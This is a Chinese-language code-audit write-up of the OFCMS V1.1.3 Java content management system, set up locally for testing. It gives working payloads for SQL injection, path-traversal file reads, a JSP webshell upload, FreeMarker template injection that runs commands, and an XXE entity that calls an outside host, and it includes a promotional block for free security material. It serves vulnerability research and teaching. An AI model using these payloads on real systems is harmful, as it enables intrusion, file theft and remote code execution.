# 前言

刚好遇到一个授权的渗透是通过该cms实现getshell，所以顺便审计一下java类的cms，这个管理系统是一个内容管理系统，下载地址

`<https://gitee.com/oufu/ofcms/tree/V1.1.3/>`

tomcat下载地址

> <https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.78/bin/apache-> tomcat-8.5.78-windows-x64.zip>

这里我选择8.5.78

# 环境搭建

    
    
    idea  
    ofcms V1.1.3  
    tomcat 8.5

idea直接创建新建项目，自动导入xml文件，配置启动服务器

![image-20220519134352038.png](https://image.3001.net/images/20220527/1653642664_629095a8231e6742c444d.png!small)

导入sql文件

    
    
    mysql -uroot -pxxxxxxx  
    use ofcms  
    source /路径.ofcms-v1.1.3.sql

![image-20220519134404640.png](https://image.3001.net/images/20220527/1653642664_629095a8c793de36b1fc6.png!small)

    
    
    show tables;

![image-20220519134414196.png](https://image.3001.net/images/20220527/1653642666_629095aa1a5524c9480f2.png!small)

这里需要注意一点儿，源码确实，无法打包war'包，解决不掉artifacts的问题

![image-20220519134427060.png](https://image.3001.net/images/20220527/1653642666_629095aad7e80e232300c.png!small)

配置端口

![image-20220519134444427.png](https://image.3001.net/images/20220527/1653642667_629095aba2afd8fa75906.png!small)

启动tomgcat的时候会乱码，修改tomcat的配置文件`tomcat->config->logging.properties`

更改所有`utf8`的格式为`GBK`

![image-20220519134455701.png](https://image.3001.net/images/20220527/1653642668_629095ac80315c42c6097.png!small)

配置maven，整一个恶心的想吐

    
    
    <mirror>  
        <id>alimaven</id>  
        <mirrorOf>central</mirrorOf>  
        <name>aliyun maven</name>  
        <url>http://maven.aliyun.com/nexus/content/repositories/central/</url>  
      </mirror>

![image-20220519134509402.png](https://image.3001.net/images/20220527/1653642669_629095ad4224ed5b52f42.png!small)

重建项目

![image-20220519134518686.png](https://image.3001.net/images/20220527/1653642670_629095ae2bef9bed3d61f.png!small)

启动服务，但是之前需要修改配置文件中的数据库的连接的字段用户名和密码，这里会报错，所以修改配置文件直接创建完成了数据库在上面导入数据库的时候跳过安装步骤。

    
    
    首页地址: localhost:8099/ofcms_admin  
    ​  
    后台地址：localhost:8099/ofcms_admin/admin/login.html  
    ​  
    admin/123456

![image-20220519134533344.png](https://image.3001.net/images/20220527/1653642671_629095af0007ab11bceda.png!small)

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

# 审计分析

## SQL注入

文件结构目录

![image-20220519134543327.png](https://image.3001.net/images/20220527/1653642671_629095af8c8c591474ec7.png!small)

因为已知漏洞都存在于后台，直接审计后台文件，首先定位到控制层代码，

![image-20220519134551877.png](https://image.3001.net/images/20220527/1653642672_629095b044e0744e4831d.png!small)

因为已经不通通过安装启动web服务，这里不需要分析安装控制层，看首页

出于对代码的尊重，跟了一波增加sql语句的处理，但是存在sql注入的过滤器，

![image-20220519134601047.png](https://image.3001.net/images/20220527/1653642672_629095b0f170c99ba17f1.png!small)

直接触发增加用户接口

![image-20220519134611181.png](https://image.3001.net/images/20220527/1653642673_629095b1e953989514e9e.png!small)

![image-20220519134622551.png](https://image.3001.net/images/20220527/1653642674_629095b2c042172b1f782.png!small)

其实可以直接看出来，在第50行的时候已经使用put方法增加了管理员用户，然后new了一个对象`record`存放存入的其它参数的数据,再往下的时候根据`record`的值判断用户的类型，向下56行F7跟进，一直跟到类sqlpara的setsql方法进行插入

![image-20220519134632162.png](https://image.3001.net/images/20220527/1653642676_629095b409224a62956b6.png!small)

在这里的时候插入的是创建时的创建时间等字段，并没插入我们传入的详细信息，但是在类`sysusercontroller`中的57行中十对创建的用户`sss`创建id编号，此时用户以及数据的插入时在58行执行结束时完成，已经写进了数据库。

`但是这里没有测试存在注入点儿`，注入点存在于`代码生成`->`新增`

![image-20220519134641396.png](https://image.3001.net/images/20220527/1653642676_629095b4ebbb168dcbdaf.png!small)

手动测试有回显`sql=1'`

![image-20220519134650155.png](https://image.3001.net/images/20220527/1653642677_629095b5ce35186c9301a.png!small)

猜测可能存在报错注入，构造payload

`update of_cms_api set api_name=updatexml(1,concat(0x7e,(user())),0) where
api_id=2`

![image-20220519134701204.png](https://image.3001.net/images/20220527/1653642678_629095b68f97e6464728f.png!small)

`\ofsoft\cms\admin\controller\system\SystemGenerateController.java`下断点分析

![image-20220519134710040.png](https://image.3001.net/images/20220527/1653642679_629095b79d4de1f31c5be.png!small)

47行，F7跟进

![image-20220519134718336.png](https://image.3001.net/images/20220527/1653642680_629095b84f6e05d5a36cb.png!small)

![image-20220519134727761.png](https://image.3001.net/images/20220527/1653642680_629095b8db957c048bb3f.png!small)

返回的sql参数的内容未作任何过滤，48行F7跟进

![image-20220519134736400.png](https://image.3001.net/images/20220527/1653642681_629095b9a778a7d42cf11.png!small)

98行跟进update方法

![image-20220519134745152.png](https://image.3001.net/images/20220527/1653642682_629095ba5d969a7db9bf7.png!small)

256行直接连接数据库进行更新，最后抛出异常，报错回显出数据库用户名`root`

## 存储型XSS

![image-20220519134753681.png](https://image.3001.net/images/20220527/1653642683_629095bb29ab9a16c3106.png!small)

分析代码，

所以这里出现存储型XSS的地方不止这一个触点儿,包括前台，Ueditor编辑器的原因。

## 任意文件读取

![image-20220519134801726.png](https://image.3001.net/images/20220527/1653642684_629095bc45f19acbc1acd.png!small)

查看文件模板，模板文件连接如下

    
    
    http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=contact.html&dir=/&dir_name=/

可控参数`dir`,payload如下

    
    
    http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=contact.html&dir=../../../&dir_name=/

![image-20220519134811782.png](https://image.3001.net/images/20220527/1653642685_629095bdac3bbe23d7a31.png!small)

控制字段`file_name`读取文件

    
    
    http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?file_name=jquery-1.10.1.min.js&dir=../../..//resource/default/static/lib&dir_name=/lib

![image-20220519134824618.png](https://image.3001.net/images/20220527/1653642686_629095bea9c97156fead2.png!small)

漏洞分析

![image-20220519134832366.png](https://image.3001.net/images/20220527/1653642688_629095c0a4fdb42b07f8f.png!small)

查看模板文件的时候，传入的dir参数以及updir的参数都为空

![image-20220519134841018.png](https://image.3001.net/images/20220527/1653642689_629095c18bc8a5baf6834.png!small)

这里是对路径文件类型做判断，读取模板文件，所这里任意文件读取也只是针对任意模板文件读取，读取文件名的控制参数数为`filename`

根据debug分析，当传入的payload为

    
    
    http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html?dir=../

![image-20220519134850480.png](https://image.3001.net/images/20220527/1653642690_629095c288c6ff267c9c7.png!small)

测试根据断点看出，我们传入的参数dir为`../`

![image-20220519134906797.png](https://image.3001.net/images/20220527/1653642691_629095c3d732f10927ae6.png!small)

在65行的时候未对传入的参数dir做过滤，这个时候已经拿到了模板目录

![image-20220519134917574.png](https://image.3001.net/images/20220527/1653642692_629095c4b8f3fa413e8b9.png!small)

读取通过循环遍历使用文件名读取

![image-20220519134925815.png](https://image.3001.net/images/20220527/1653642693_629095c56b3e56cce0a82.png!small)

在调试的时候发现，我们访问目录。这里访问`comn`

![image-20220519134934205.png](https://image.3001.net/images/20220527/1653642694_629095c6277bc86497dff.png!small)

在控制层TemplateController内调用函数getSiteTemplatePath()

![image-20220519134943633.png](https://image.3001.net/images/20220527/1653642694_629095c6dd76db4127eeb.png!small)

F7跟进，在类file.java中对路径进行了直接拼接

![image-20220519134959288.png](https://image.3001.net/images/20220527/1653642696_629095c80e233e29eff7f.png!small)

所以只要调用file函数拼接的参数也必定会产生"任意"文件读取。那么所能使用的payload如下

    
    
    ?dir=../  
    ?up_dir=../  
    #含文件名  
    ?file_name=page.html&up_dir=../comn  
    ?file_name=page.html&dir=../comn

## 文件上传实现webshell

刚好该类这里又save方法调用了上面的函数，所以我们可以保证我们上传文件的路径是可控的

![image-20220519135009522.png](https://image.3001.net/images/20220527/1653642696_629095c8c24d02ba04e93.png!small)

![image-20220519135018258.png](https://image.3001.net/images/20220527/1653642697_629095c9c3393df46ba13.png!small)

尝试构造数据包

![image-20220519135032254.png](https://image.3001.net/images/20220527/1653642698_629095cac03be744d5cbd.png!small)

此时已经成功保存，但是通过文件读取是读不到文件的，实际上已经写进去了，因为在读取文件的时候限制了读取的文件类型，可以尝试保存一个html

![image-20220519135040538.png](https://image.3001.net/images/20220527/1653642700_629095cc2c7113de7ca22.png!small)

验证是可以写入的，那么直接写入jsp木马实现webshell

![image-20220519135058995.png](https://image.3001.net/images/20220527/1653642700_629095ccefce8a5b92073.png!small)

最后一个断点执行结束，此时shell已成功写入

    
    
    http://localhost:8099/ofcms_admin/static/1.jsp

![image-20220519135111187.png](https://image.3001.net/images/20220527/1653642702_629095ce27c0b8cd16e73.png!small)

## SSTI模板注入

同样在save模板的时候我们分析，在125行的时候传入file文件以及文件内容

![image-20220519135122677.png](https://image.3001.net/images/20220527/1653642703_629095cf22d0ca1254b91.png!small)

f7跟进函数，发现在类fileutils中的，writestring方法中在78行的时候拿到的string还是我们在前端输入的内容

![image-20220519135133404.png](https://image.3001.net/images/20220527/1653642704_629095d03a2142ef1e0fe.png!small)

继续F7跟进函数

![image-20220519135142608.png](https://image.3001.net/images/20220527/1653642705_629095d120ea8cdc6f93c.png!small)

这里直接对string进行了编码

payload

    
    
    <#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

访问

> <http://localhost:8099/ofcms_admin/about.html>

![image-20220519135152274.png](https://image.3001.net/images/20220527/1653642706_629095d24badf8e2fc7ce.png!small)

所以这里漏洞的触发点也很多，html页面都可以，当然也可以利用上面的文件上传进行写入页面调用也可以触发。漏洞的触发原理可参考这个文章

`<http://t.zoukankan.com/Eleven-Liu-p-12747908.html>`

很清晰

## XXE漏洞

直接分析漏洞代码下断点

`ofcms-V1.1.3\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\ReprotAction.java`

前端功能模块`导出`

定位到控制器处理方法，在 `com.ofsoft.cms.admin.controller.ReprotAction`类的 expReport 方法中。

![image-20220519135213952.png](https://image.3001.net/images/20220527/1653642708_629095d446551c70d4232.png!small)

使用上文的任意文件读取，在静态页面下放入我们写入的jrxml文件，文件命名为`xxe.jrxml`,构造payload

    
    
    POST /ofcms_admin/admin/cms/template/save.json HTTP/1.1  
    Host: localhost:8099  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0  
    Accept: application/json, text/javascript, */*; q=0.01  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
    X-Requested-With: XMLHttpRequest  
    Content-Length: 394  
    Origin: http://localhost:8099  
    Connection: close  
    Referer: http://localhost:8099/ofcms_admin/admin/cms/template/getTemplates.html  
    Cookie: JSESSIONID=FCF2920F5C1C3ECAC592420888B66674; Phpstorm-63ee32fd=c3d51684-64a8-4398-bce8-86b8077fb103; XDEBUG_SESSION=XDEBUG_ECLIPSE  
    ​  
    file_path=G%3A%5Cofcms113%5Capache-tomcat-8.5.78%5Cwebapps%5Cofcms_admin%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&dirs=%2F&res_path=&file_name=index.html&file_content=%3c%21%44%4f%43%54%59%50%45%20%70%6f%65%6d%20%5b%3c%21%45%4e%54%49%54%59%20%25%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%36%36%2e%31%32%38%3a%38%30%38%31%22%3e%25%78%78%65%3b%20%5d%3e

文件内容的payload

    
    
    <!DOCTYPE poem [<!ENTITY % xxe SYSTEM "http://192.168.166.128:8081">%xxe; ]>

![image-20220519135228637.png](https://image.3001.net/images/20220527/1653642709_629095d5aabaf07292359.png!small)

![image-20220519135236920.png](https://image.3001.net/images/20220527/1653642710_629095d6b91057bd3ad3e.png!small)

直接访问

    
    
    http://localhost:8099/ofcms_admin/admin/reprot/expReport.html?%20j=../../static/xxe

![image-20220519135250752.png](https://image.3001.net/images/20220527/1653642711_629095d770c25d7eecd19.png!small)

漏洞成因是调用了 getParamsMap 方法，获取用户提交的所有参数，并将 j 参数赋值给 jrxmlFileName ，服务器接收用户输入的 j
参数后，拼接生成文件路径，可直接穿越其它目录，但是限制了文件后缀为 jrxml，所以文件名命名为jrxml

先调用getParamsMap 方法

![image-20220519135325032.png](https://image.3001.net/images/20220527/1653642712_629095d86032c15a2a533.png!small)

而后调用JasperCompileManager.compileReport() 方法

![image-20220519135334814.png](https://image.3001.net/images/20220527/1653642713_629095d955b30d79c8377.png!small)

F7跟进，在 compile方法中调用 JRXmlLoader.load() 方法，F7跟进,在 loadXML 方法中调用了 Digester 类的
parse 解析我们的 XML 文档对象，默认是没有禁用外部实体解析，所以xxe文件能执行。

# 总结

抛开白盒审计不说，sql注入实现比较简单，黑盒状态下也可知道用户名实现，跨站类可以通过js类的实现对用户的上线，高危的文件读取和webshell以及xxe，总的来说都是在文件读取目录遍历的基础上实现的，否则对于二次开发的网站抛开任意文件读取这个漏洞来说是无法实现webshell的。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

